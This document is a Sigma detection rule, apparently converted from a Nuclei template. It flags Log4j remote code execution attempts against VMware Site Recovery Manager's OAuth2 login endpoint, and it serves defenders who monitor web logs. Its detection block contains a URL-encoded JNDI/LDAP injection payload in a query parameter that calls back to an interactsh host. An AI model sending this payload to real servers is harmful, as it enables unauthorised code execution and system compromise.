title: VMware Site Recovery Manager - Remote Code Execution (Apache Log4j)
id: bca8a4c4-c2d6-478b-9cdf-daaf39ae8052
status: experimental
logsource:
  product: webserver
description: 'VMware Site Recovery Manager is susceptible to remote code execution
  via the Apache Log4j framework. An attacker can execute malware, obtain sensitive
  information, modify data, and/or gain full control over a compromised system without
  entering necessary credentials.

  '
reference: 'Generated by converting Nuclei Template. Template ID: vmware-siterecovery-log4j-rce
  Refer the templates here: https://github.com/projectdiscovery/nuclei-templates'
author: 'Exploit/Attack Authors: akincibor; Converted to Sigma by: @pbssubhash'
date: 2024/06/23
detection:
  selection-method-1:
    cs-method: GET
  selection-paths-1:
    cs-uri-stem:
      - /dr/authentication/oauth2/oauth2login
  selection-query-1:
    cs-uri-query:
      - error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.{{interactsh-url}}%7D
  filter-status-code-1:
    sc-status: 404
  condition: selection-method-1 and selection-paths-1 and selection-query-1 and not
    filter-status-code-1
level: low
falsepositives: Nuclei scanning, Legitimate penetration testing
